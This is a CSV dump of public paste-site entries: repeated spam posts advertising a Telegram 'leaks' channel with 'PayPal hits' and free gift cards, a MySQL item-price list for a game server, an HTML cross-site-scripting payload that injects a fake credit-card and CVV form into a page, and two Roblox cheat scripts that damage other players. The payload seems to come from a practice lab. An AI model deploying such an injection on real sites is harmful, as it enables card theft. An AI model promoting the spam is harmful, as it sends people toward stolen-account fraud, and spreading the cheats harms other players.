id,title,username,language,date,content
bkHXRZkp,PayPal hits,Destrxtion,JavaScript,Saturday 17th of May 2025 11:59:29 AM CDT,"
Check it out at >> https://t.me/leakzbyem1nem

57220
"
cPXMeAVr,FREE 200$ GIFTCARDS,Destrxtion,JavaScript,Saturday 17th of May 2025 11:59:22 AM CDT,"
Check it out at >> https://t.me/leakzbyem1nem

17059
"
MuuT6vte,Telegram with Leaks,Destrxtion,JavaScript,Saturday 17th of May 2025 11:59:15 AM CDT,"
Check it out at >> https://t.me/leakzbyem1nem

94372
"
R5xUVZMP,Make 1000$ in 24 hours,Destrxtion,JavaScript,Saturday 17th of May 2025 11:37:09 AM CDT,"
Check it out at >> https://t.me/leakzbyem1nem

12784
"
T4PcniT7,PayPal hits,Destrxtion,JavaScript,Saturday 17th of May 2025 11:37:02 AM CDT,"
Check it out at >> https://t.me/leakzbyem1nem

80124
"
Ra6nLHkf,FREE 200$ GIFTCARDS,Destrxtion,JavaScript,Saturday 17th of May 2025 11:36:54 AM CDT,"
Check it out at >> https://t.me/leakzbyem1nem

70272
"
EXwW8e71,Telegram with Leaks,Destrxtion,JavaScript,Saturday 17th of May 2025 11:36:46 AM CDT,"
Check it out at >> https://t.me/leakzbyem1nem

51081
"
1FPHa1jr,Вещи ВД гер + ключи(430 илвл),Sansuall,MySQL,Saturday 17th of May 2025 11:17:53 AM CDT,"REPLACE INTO TItemPrice VALUES
-- ALL 430 ILVL
-- Вещи ВД ГЕР(5 контекст)
(168389, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168353, 2, 1820, 'Y', 000, '4823,1502,6267,4786', 0, 5),
(168397, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168900, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168376, 2, 1820, 'Y', 000, '4799,1808,1502,4786', 0, 5),
(168343, 2, 1820, 'Y', 000, '4823,1502,6266,4786', 0, 5),
(168385, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168373, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(169312, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168885, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168383, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168362, 2, 1820, 'Y', 000, '4823,1502,6268,4786', 0, 5),
(168379, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168342, 2, 1820, 'Y', 000, '4823,1502,6268,4786', 0, 5),
(169307, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168363, 2, 1820, 'Y', 000, '4823,1502,6266,4786', 0, 5),
(168337, 2, 1820, 'Y', 000, '4823,1502,6266,4786', 0, 5),
(168884, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(169308, 2, 1820, 'Y', 000, '4799,1808,1502,4786', 0, 5),
(168301, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(169306, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168391, 2, 1820, 'Y', 000, '4799,1808,1502,4786', 0, 5),
(169588, 2, 1820, 'Y', 000, '4823,1502,6268,4786', 0, 5),
(168882, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168349, 2, 1820, 'Y', 000, '4823,1502,6267,4786', 0, 5),
(168868, 2, 1820, 'Y', 000, '4823,1502,6268,4786', 0, 5),
(168346, 2, 1820, 'Y', 000, '4823,1502,6268,4786', 0, 5),
(168872, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168274, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168893, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(169309, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168476, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168339, 2, 1820, 'Y', 000, '4823,1502,6267,4786', 0, 5),
(169319, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168899, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168365, 2, 1820, 'Y', 000, '4823,1502,6267,4786', 0, 5),
(168604, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168897, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168894, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168352, 2, 1820, 'Y', 000, '4823,1502,6266,4786', 0, 5),
(168875, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168359, 2, 1820, 'Y', 000, '4823,1502,6268,4786', 0, 5),
(168273, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168361, 2, 1820, 'Y', 000, '4823,1502,6266,4786', 0, 5),
(168345, 2, 1820, 'Y', 000, '4823,1502,6267,4786', 0, 5),
(168901, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168903, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168276, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168386, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168387, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168306, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168341, 2, 1820, 'Y', 000, '4823,1502,6266,4786', 0, 5),
(168390, 2, 1820, 'Y', 000, '4799,1808,1502,4786', 0, 5),
(168818, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168371, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168384, 2, 1820, 'Y', 000, '4799,1808,1502,4786', 0, 5),
(168905, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168475, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168478, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168355, 2, 1820, 'Y', 000, '4823,1502,6266,4786', 0, 5),
(169313, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168348, 2, 1820, 'Y', 000, '4823,1502,6268,4786', 0, 5),
(168336, 2, 1820, 'Y', 000, '4823,1502,6267,4786', 0, 5),
(168360, 2, 1820, 'Y', 000, '4823,1502,6267,4786', 0, 5),
(168388, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168382, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168375, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168378, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168380, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168381, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168372, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168374, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168354, 2, 1820, 'Y', 000, '4823,1502,6268,4786', 0, 5),
(168870, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168347, 2, 1820, 'Y', 000, '4823,1502,6267,4786', 0, 5),
(169311, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168904, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168883, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168367, 2, 1820, 'Y', 000, '4823,1502,6266,4786', 0, 5),
(168335, 2, 1820, 'Y', 000, '4823,1502,6266,4786', 0, 5),
(169305, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168876, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168889, 2, 1820, 'Y', 000, '4799,1808,1502,4786', 0, 5),
(169315, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168896, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168338, 2, 1820, 'Y', 000, '4823,1502,6268,4786', 0, 5),
(168879, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168898, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168364, 2, 1820, 'Y', 000, '4823,1502,6268,4786', 0, 5),
(168892, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168350, 2, 1820, 'Y', 000, '4823,1502,6266,4786', 0, 5),
(168357, 2, 1820, 'Y', 000, '4823,1502,6267,4786', 0, 5),
(168881, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(169316, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168891, 2, 1820, 'Y', 000, '4799,1808,1502,4786', 0, 5),
(168888, 2, 1820, 'Y', 000, '4799,1808,1502,4786', 0, 5),
(168869, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168887, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168275, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168880, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(168878, 2, 1820, 'Y', 000, '4799,1808,1502,4786', 0, 5),
(168871, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
(169314, 2, 1820, 'Y', 000, '4799,1502,4786', 0, 5),
-- (16 контекст)
(159623, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159622, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159630, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(155881, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(158320, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(158319, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159610, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(158712, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159631, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159625, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159624, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159611, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159626, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159612, 2, 1820, 'Y', 000, '5010,4802,1602,4786', 0, 16),
(159619, 2, 1820, 'Y', 000, '5010,4802,1602,4786', 0, 16),
(158367, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159618, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159617, 2, 1820, 'Y', 000, '5010,4802,1602,4786', 0, 16),
(159620, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159615, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159614, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(158368, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159627, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(158374, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
(159644, 2, 1820, 'Y', 000, '5010,1602,4786', 0, 16),
-- (16 контекст)
(168963, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(168965, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(168973, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(168977, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(168978, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169035, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169055, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169058, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169064, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169068, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169069, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169076, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169156, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169157, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169158, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169159, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169160, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169161, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16),
(169344, 2, 1820, 'Y', 000, '5010,1487,4786', 0, 16);"
JRVxv8vg,websecpwa,kkaszon,HTML,Saturday 17th of May 2025 10:45:30 AM CDT,"<script>document.getElementsByClassName('vulnerable_code_area')[0].innerHTML='<form action=""http://localhost/"" method=""GET"">Card Number :<input type=""text"" name=""cardno""><br>CVV No :<input type=""text"" name=""cvvno""><br>Expire Date<input type=""text"" name=""exp""><br><input type=""submit"" value=""Update""><br></form>';</script>"
9NyemaqZ,Untitled,Gaynoob,Lua,Saturday 17th of May 2025 10:36:38 AM CDT,"local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local uis = game:GetService(""UserInputService"")

-- Play startup sound
local function playSound(id, volume)
    local sound = Instance.new(""Sound"", char:FindFirstChild(""Head"") or char)
    sound.SoundId = id
    sound.Volume = volume or 1
    sound:Play()
    game.Debris:AddItem(sound, 3)
end

playSound(_G.settings[""RedStartupId""] or ""rbxassetid://1837635122"", 1.5)

-- Glitch effect
local function glitchEffect()
    local part = Instance.new(""Part"", workspace)
    part.Anchored = true
    part.CanCollide = false
    part.Size = Vector3.new(12, 0.5, 12)
    part.CFrame = char.HumanoidRootPart.CFrame * CFrame.new(0, -3, 0)
    part.Color = _G.settings[""EffectColor""] or Color3.fromRGB(255, 0, 0)
    part.Material = Enum.Material.Neon
    game.Debris:AddItem(part, 1)

    local shockwave = Instance.new(""ParticleEmitter"", part)
    shockwave.Texture = ""rbxassetid://243660364""
    shockwave.Size = NumberSequence.new(5)
    shockwave.Rate = 1000
    shockwave.Lifetime = NumberRange.new(0.5)
    shockwave.Speed = NumberRange.new(20)
    shockwave.Color = ColorSequence.new(_G.settings[""EffectColor""])
    game.Debris:AddItem(shockwave, 1)
end

-- Coolkid punch move
local function punch()
    glitchEffect()
    playSound(_G.settings[""RedHitId""], 1.2)

    -- Optional screen shake
    local cam = workspace.CurrentCamera
    coroutine.wrap(function()
        for i = 1, 5 do
            cam.CFrame = cam.CFrame * CFrame.new(math.random(-1,1), math.random(-1,1), 0)
            wait(0.05)
        end
    end)()

    -- Damage + Knockback nearby players
    for _, target in pairs(game.Players:GetPlayers()) do
        if target ~= player and target.Character and target.Character:FindFirstChild(""HumanoidRootPart"") then
            local hrp = target.Character.HumanoidRootPart
            local dist = (hrp.Position - char.HumanoidRootPart.Position).Magnitude
            if dist < 15 then
                hrp.Velocity = (hrp.Position - char.HumanoidRootPart.Position).Unit * 100 + Vector3.new(0, 60, 0)
                local humanoid = target.Character:FindFirstChild(""Humanoid"")
                if humanoid then
                    humanoid:TakeDamage(35)
                end
            end
        end
    end
end

-- Keybind
uis.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.F then
        punch()
    end
end)

-- Glitch UI
if _G.settings[""GlitchText""] then
    local gui = Instance.new(""ScreenGui"", player:WaitForChild(""PlayerGui""))
    gui.Name = ""CoolkidHack""

    local text = Instance.new(""TextLabel"", gui)
    text.Size = UDim2.new(1, 0, 0.1, 0)
    text.Position = UDim2.new(0, 0, 0, 0)
    text.Text = ""COOLKID OWNS THIS PLACE""
    text.TextColor3 = _G.settings[""EffectColor""]
    text.BackgroundTransparency = 1
    text.Font = Enum.Font.Code
    text.TextScaled = true

    coroutine.wrap(function()
        while gui.Parent do
            text.Text = text.Text .. ""|""
            wait(0.1)
            text.Text = text.Text:sub(1, -2)
            wait(0.1)
        end
    end)()
end"
AFuvxrz0,Untitled,Gaynoob,Java,Saturday 17th of May 2025 10:21:12 AM CDT,"local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- Play startup sound
local function playSound(id, volume)
    local sound = Instance.new(""Sound"", char:FindFirstChild(""Head"") or char)
    sound.SoundId = id
    sound.Volume = volume or 1
    sound:Play()
    game.Debris:AddItem(sound, 3)
end

playSound(_G.settings[""RedStartupId""] or ""rbxassetid://1837635122"", 1.5)

-- Glitch effect
local function glitchEffect()
    local part = Instance.new(""Part"", workspace)
    part.Anchored = true
    part.CanCollide = false
    part.Size = Vector3.new(12, 0.5, 12)
    part.CFrame = char.HumanoidRootPart.CFrame * CFrame.new(0, -3, 0)
    part.Color = _G.settings[""EffectColor""] or Color3.fromRGB(255, 0, 0)
    part.Material = Enum.Material.Neon
    game.Debris:AddItem(part, 1)
end

-- Punch move with glitch
local function punch()
    playSound(_G.settings[""RedHitId""], 1.2)
    glitchEffect()

    -- Optional: knockback or explosion
    for _, v in pairs(workspace:GetChildren()) do
        if v:IsA(""Model"") and v:FindFirstChild(""HumanoidRootPart"") and v ~= char then
            local dist = (v.HumanoidRootPart.Position - char.HumanoidRootPart.Position).Magnitude
            if dist < 10 then
                v.HumanoidRootPart.Velocity = (v.HumanoidRootPart.Position - char.HumanoidRootPart.Position).Unit * 80
            end
        end
    end
end

-- Bind to F key
game:GetService(""UserInputService"").InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.F then
        punch()
    end
end)

-- Coolkid glitch text
if _G.settings[""GlitchText""] then
    local gui = Instance.new(""ScreenGui"", player:WaitForChild(""PlayerGui""))
    gui.Name = ""CoolkidHack""

    local text = Instance.new(""TextLabel"", gui)
    text.Size = UDim2.new(1, 0, 0.1, 0)
    text.Position = UDim2.new(0, 0, 0, 0)
    text.Text = ""COOLKID OWNS THIS PLACE""
    text.TextColor3 = _G.settings[""EffectColor""]
    text.BackgroundTransparency = 1
    text.Font = Enum.Font.Code
    text.TextScaled = true

    coroutine.wrap(function()
        while gui.Parent do
            text.Text = text.Text .. ""|""
            wait(0.1)
            text.Text = text.Text:sub(1, -2)
            wait(0.1)
        end
    end)()
end"
